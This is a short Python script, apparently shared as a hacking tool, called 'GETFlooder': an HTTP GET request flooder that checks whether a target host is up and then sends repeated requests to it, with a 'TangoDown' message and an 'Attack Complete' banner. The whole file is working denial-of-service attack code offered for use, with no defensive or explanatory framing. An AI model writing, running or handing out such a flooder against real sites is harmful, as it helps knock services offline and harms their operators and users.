import requests
import argparse
import time

print("""

   __________________________                __         
  / ____/ ____/_  __/ ____/ /___  ____  ____/ /__  _____
 / / __/ __/   / / / /_  / / __ \\/ __ \\/ __  / _ \\/ ___/
/ /_/ / /___  / / / __/ / / /_/ / /_/ / /_/ /  __/ /    
\\____/_____/ /_/ /_/   /_/\\____/\\____/\\__,_/\\___/_/     
                                                        
ver 2.5.29.2020
// Added check if Target is up
// Better status code responses
// Added flag for sleep
by
NoDisassemble

""")

parser = argparse.ArgumentParser(description="HTTP GET Request Flooder")
parser.add_argument('-t', '--target', type=str, metavar="", required=True, help="[Required] IP of the Target")
parser.add_argument('-r', '--rounds', type=int, metavar="", required=True, help="[Required] Number of Requests to Send")
parser.add_argument('-s', '--sleep', type=int, metavar="", required=False, default=0, help="[Optional] Time between attacks")
parser.add_argument('-m', '--message', type=str, metavar="", required=False, help="[Optional] Message sent with GET Request")
args = parser.parse_args()


def status():
    print("Checking if Target is Up...")
    time.sleep(2)
    try:
        r = requests.get('http://' + args.target, headers={'user-agent': "Ar3Y0uAliv3?"})
        if r.status_code == 200:
            print("[+] Status >> " + str(r.status_code))
            time.sleep(1)
            print("[+] Target is Up!")
            time.sleep(2)
            print("[+] Initializing Flooder...")
            time.sleep(2)
        elif r.status_code != 200:
            print("[!] Status >> " + str(r.status_code))
            time.sleep(1)
            print("[!] The website appears to be down!")
            time.sleep(2)
            print("[!] Exiting Flooder...")
            time.sleep(2)
            print("")
            exit()
    except requests.exceptions.RequestException:
        print("[!] Status >> Null")
        time.sleep(1)
        print("[!] The website appears to be offline!")
        time.sleep(2)
        print("[!] Exiting Flooder...")
        time.sleep(2)
        print("")
        exit()


def flooder():
    count = 1
    print("""
====================================
[!] Flooding Target: """ + str(args.target) + """
====================================
    """)
    time.sleep(1)
    while count < int(args.rounds) + 1:
        try:
            print("[" + str(count)+"] Flooding " + str(args.target))
            r = requests.get('http://' + args.target, headers={'user-agent': args.message})
            count += 1
            if r.status_code == 200:
                print("[+] Status >> " + str(r.status_code))
                time.sleep(args.sleep)
            elif r.status_code != 200:
                print("[!] Status >> " + str(r.status_code))
                print("[!] TangoDown")
                time.sleep(args.sleep)
            else:
                continue
        except requests.exceptions.RequestException:
            print("[!] Status >> Null")
            print("")
            print("[!] Connection was forcibly closed by the remote host.")
            time.sleep(1)
            print("[!] The Target may be down!")
            time.sleep(2)
            print("")
            print("Exiting Flooder...")
            time.sleep(2)
            exit()
    print("""
====================================
[!] Attack Complete
====================================
    """)


if __name__ == "__main__":
    status()
    flooder()
